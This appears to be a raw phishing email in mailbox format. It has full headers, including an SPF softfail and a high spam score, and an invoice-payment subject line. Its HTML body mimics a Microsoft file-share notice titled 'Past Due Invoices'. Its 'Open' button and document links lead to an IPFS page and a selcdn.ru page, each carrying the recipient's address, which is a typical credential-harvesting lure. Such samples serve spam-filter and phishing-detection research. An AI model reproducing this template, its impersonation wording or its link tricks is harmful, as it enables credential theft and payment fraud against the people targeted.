@@ -1,0 +1,120 @@
+From jose@monkey.org Sat May 27 01:55:15 2023 +0000
+Return-Path: account@doova-furniture.com
+Delivered-To: jose@monkey.org
+X-FDA: 80834367390.22.0EDD421
+Received: from mail.berrymobile.jp (smtp.berrymobile.jp [210.148.14.27])
+	by imf30.b.hostedemail.com (Postfix) with ESMTP id 99470180006
+	for <jose@monkey.org>; Sat, 27 May 2023 01:55:13 +0000 (UTC)
+Authentication-Results: imf30.b.hostedemail.com;
+	dkim=none;
+	dmarc=none;
+	spf=softfail (imf30.b.hostedemail.com: 210.148.14.27 is neither permitted nor denied by domain of account@doova-furniture.com) smtp.mailfrom=account@doova-furniture.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
+	s=arc-20220608; t=1685152514;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references; bh=FI5LtaS6Mrtbfzgq0iBrBpd7XTjkV9MZ8rlHfE3xDaM=;
+	b=J2PEohCOQH57xl1VvJt2yFjs3ClZZmqo6JZn36/B67khOqL1RyS+irTDnGHCr0FY9AfLi1
+	SSFmulaBis9Nyje4y357vZzdVDDa9WuCJFrICcWGwjauqTV2+IYkus4UyJ3dOht3M+2tGp
+	g/KZuzK7XthWBCbFgQt0ao8q6gyQmNg=
+ARC-Authentication-Results: i=1;
+	imf30.b.hostedemail.com;
+	dkim=none;
+	dmarc=none;
+	spf=softfail (imf30.b.hostedemail.com: 210.148.14.27 is neither permitted nor denied by domain of account@doova-furniture.com) smtp.mailfrom=account@doova-furniture.com
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1685152514; a=rsa-sha256;
+	cv=none;
+	b=5YZvwM7Dy2kME1ZMNW9J0TlJYTYxtjE1A3jM47c5pdkwbAcfl2vtKaepc/iCav3Gj+hVGI
+	+xh34X6GMvR9zsSz21zL7HBUKY0TXvHcRRJZarTXUf1820bb5CMcT64qQDQTQtDjnmHPj6
+	VVyn4qElxQIfWB7+BjVVuVlOVBNH75Q=
+Received: from [20.81.201.51] (unknown [20.81.201.51])
+	by mail.berrymobile.jp (Postfix) with ESMTPA id 594FD1C47AAD
+	for <jose@monkey.org>; Tue, 23 May 2023 19:27:06 +0900 (JST)
+From: account@doova-furniture.com
+To: jose@monkey.org
+Subject: RE: Request Revised Invoice for payment - USD76,223.00
+Date: 23 May 2023 10:39:20 +0000
+Message-ID: <20230523103920.860F3E9F9F73DC45@doova-furniture.com>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+X-Rspamd-Server: rspam11
+X-Rspamd-Queue-Id: 99470180006
+X-Stat-Signature: txfncceefrhu5ek8diu33hhynr1cch5h
+X-Rspam-User: 
+X-Spam-Status: Yes, score=19.80
+X-HE-Tag: 1685152513-347331
+X-HE-Meta: U2FsdGVkX1+Zf7DcVL6hVGAodu3Fc+HCZqWoL1asLI8mlWawcg1gzOECTwLymib9XNCiJTpnvQF+N4O7LwDXRbGhM4BtdAS/tvLrIeeHrTggrOwhnwACfZasZm0g1WoSLwTbSrxOaC3qsssUo5rDSYL2obMBrovQhHIqV+YQjrFv8DrF7769y4Vp8I/opgnZM1mcuHfFSOllvx9ui5OuIdvR45WFqUTLKBckm2E951t38e2NfH/ypVGDtKW9Cp1xjUNAij8fcApAP7oYVBb1MsKJHhXd6o0g
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 133
+
+<DIV style=3D"PADDING-BOTTOM: 32px; PADDING-TOP: 32px; PADDING-LEFT: 8px; P=
+ADDING-RIGHT: 8px" align=3D"center"><TABLE role=3D"presentation" style=3D"O=
+VERFLOW: hidden; MAX-WIDTH: 640px; BORDER-TOP: #c8c8c8 1px solid; BORDER-RI=
+GHT: #c8c8c8 1px solid; WIDTH: 100%; BORDER-BOTTOM: #c8c8c8 1px solid; MARG=
+IN: 0px auto; BORDER-LEFT: #c8c8c8 1px solid; BACKGROUND-COLOR: #ffffff; bo=
+x-shadow: 0px 3px 6px rgba(0,0,0,0.05); border-radius: 8px" cellspacing=3D"=
+0" cellpadding=3D"0" border=3D"0"> <COLGROUP> <COL style=3D"WIDTH: 2.5%" wi=
+dth=3D"16"> <COL style=3D"WIDTH: 95%" width=3D"608"> <COL style=3D"WIDTH: 2=
+=2E5%" width=3D"16"></COLGROUP> <TBODY><TR><TD style=3D"PADDING-TOP: 36px; =
+PADDING-LEFT: 36px; PADDING-RIGHT: 36px" colspan=3D"3" align=3D"center">&nb=
+sp;</TD></TR><TR><TD style=3D"PADDING-BOTTOM: 36px; PADDING-TOP: 20px; PADD=
+ING-LEFT: 36px; PADDING-RIGHT: 36px" colspan=3D"3" align=3D"center"> <P sty=
+le=3D"FONT-SIZE: 24px; MAX-WIDTH: 400px; FONT-WEIGHT: 600; COLOR: #323130; =
+PADDING-BOTTOM: 0px; TEXT-ALIGN: center; PADDING-TOP: 0px; PADDING-LEFT: 0p=
+x; MARGIN: 0px; LINE-HEIGHT: 32px; PADDING-RIGHT: 0px">Account Department s=
+hared a file with you </P></TD></TR><TR><TD style=3D"BORDER-TOP: #dedede 1p=
+x solid; PADDING-BOTTOM: 28px; TEXT-ALIGN: center; PADDING-TOP: 40px; PADDI=
+NG-LEFT: 20px; PADDING-RIGHT: 20px; BACKGROUND-COLOR: #f8f8f8" colspan=3D"3=
+"> <P style=3D"FONT-SIZE: 16px; COLOR: #323130; MARGIN: 0px">Here's the doc=
+ument that Account Department shared with you. </P></TD></TR><TR><TD style=
+=3D"BACKGROUND-COLOR: #f8f8f8" colspan=3D"3" align=3D"center"><A aria-label=
+=3D"202110_Waterloo_ Job description - Kitchen Assistant" style=3D"TEXT-DEC=
+ORATION: none; COLOR: #323130; DISPLAY: inline-block" href=3D"https://ipfs.=
+io/ipfs/QmS3NhgBcvwyRC1wgQWxK2PjXd8tUTSeo55pyDceZK5SC9#jose@monkey.org "><T=
+ABLE role=3D"presentation" style=3D"WIDTH: 100%; BACKGROUND: #ffffff; TEXT-=
+ALIGN: center" cellspacing=3D"0" cellpadding=3D"0" align=3D"center" border=
+=3D"0"> <TBODY><TR><TD style=3D"BORDER-TOP: #d2d2d2 1px solid; BACKGROUND: =
+#ffffff; BORDER-BOTTOM: #d2d2d2 1px solid; PADDING-BOTTOM: 20px; PADDING-TO=
+P: 20px; PADDING-LEFT: 20px; BORDER-LEFT: #d2d2d2 1px solid; PADDING-RIGHT:=
+ 4px">&nbsp;</TD><TD style=3D"FONT-SIZE: 16px; BORDER-TOP: #d2d2d2 1px soli=
+d; BORDER-RIGHT: #d2d2d2 1px solid; BORDER-BOTTOM: #d2d2d2 1px solid; WORD-=
+BREAK: break-all; PADDING-BOTTOM: 20px; TEXT-ALIGN: left; PADDING-TOP: 20px=
+; PADDING-LEFT: 4px; PADDING-RIGHT: 20px; BACKGROUND-COLOR: #ffffff">202110=
+ Past Due Invoices&nbsp;</TD></TR></TBODY></TABLE></A></TD></TR><TR><TD sty=
+le=3D"TEXT-ALIGN: center; BACKGROUND-COLOR: #f8f8f8" colspan=3D"3" align=3D=
+"center"> <DIV style=3D"DISPLAY: inline-block"><TABLE role=3D"presentation"=
+ style=3D"HEIGHT: 20px; WIDTH: auto" cellspacing=3D"0" cellpadding=3D"0" al=
+ign=3D"center" border=3D"0"> <TBODY><TR><TD style=3D"HEIGHT: 20px; PADDING-=
+BOTTOM: 20px; PADDING-TOP: 24px; PADDING-LEFT: 0px; PADDING-RIGHT: 4px" ali=
+gn=3D"center">&nbsp;</TD>
+<TD style=3D"FONT-SIZE: 12px; COLOR: #323130; PADDING-BOTTOM: 20px; PADDING=
+-TOP: 20px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px">Attachment is sent for&n=
+bsp;jose@monkey.org </TD></TR></TBODY></TABLE></DIV></TD></TR><TR><TD style=
+=3D"BORDER-TOP: medium none; HEIGHT: 40px; BORDER-BOTTOM: medium none; PADD=
+ING-BOTTOM: 32px; TEXT-ALIGN: center; PADDING-TOP: 0px; PADDING-LEFT: 0px; =
+PADDING-RIGHT: 0px; BACKGROUND-COLOR: #f8f8f8" colspan=3D"3"><A style=3D"BO=
+RDER-TOP-STYLE: solid; FONT-SIZE: 16px; TEXT-DECORATION: none; BORDER-TOP-C=
+OLOR: #0078d4; WIDTH: 168px; BORDER-BOTTOM-STYLE: solid; BORDER-LEFT-COLOR:=
+ #0078d4; COLOR: #ffffff; BORDER-BOTTOM-COLOR: #0078d4; TEXT-ALIGN: center;=
+ BORDER-RIGHT-STYLE: solid; BORDER-LEFT-STYLE: solid; DISPLAY: inline-block=
+; BORDER-RIGHT-COLOR: #0078d4; LINE-HEIGHT: 40px; BACKGROUND-COLOR: #0078d4=
+; border-radius: 2px" href=3D"https://762525.selcdn.ru/links/index-runcube.=
+html#jose@monkey.org">Open </A></TD></TR></TBODY></TABLE><TABLE role=3D"pre=
+sentation" style=3D"OVERFLOW: hidden; MAX-WIDTH: 640px; WIDTH: 100%; MARGIN=
+: 0px auto" cellspacing=3D"0" cellpadding=3D"0" border=3D"0"> <COLGROUP> <C=
+OL style=3D"WIDTH: 10%" width=3D"64"> <COL style=3D"WIDTH: 40%" width=3D"25=
+6"> <COL style=3D"WIDTH: 21.09%" width=3D"135"> <COL style=3D"WIDTH: 27.34%=
+" width=3D"175"></COLGROUP> <TBODY><TR><TD style=3D"HEIGHT: 18px; VERTICAL-=
+ALIGN: top; PADDING-BOTTOM: 16px; PADDING-TOP: 16px; PADDING-LEFT: 16px; PA=
+DDING-RIGHT: 16px" valign=3D"top" colspan=3D"2"> </TD><TD style=3D"FONT-SIZ=
+E: 12px; HEIGHT: 18px; WIDTH: 50%; COLOR: #605e5c; PADDING-BOTTOM: 16px; TE=
+XT-ALIGN: right; PADDING-TOP: 16px; PADDING-LEFT: 16px; LINE-HEIGHT: 18px; =
+PADDING-RIGHT: 16px; mso-line-height-rule: exactly" colspan=3D"2"><SPAN sty=
+le=3D"DISPLAY: inline-block">Privacy Statement </SPAN></TD></TR></TBODY></T=
+ABLE></DIV><IMG role=3D"presentation" aria-hidden=3D"true" src=3D"" width=
+=3D"1" height=3D"1" istrackingpixel=3D"true">=20
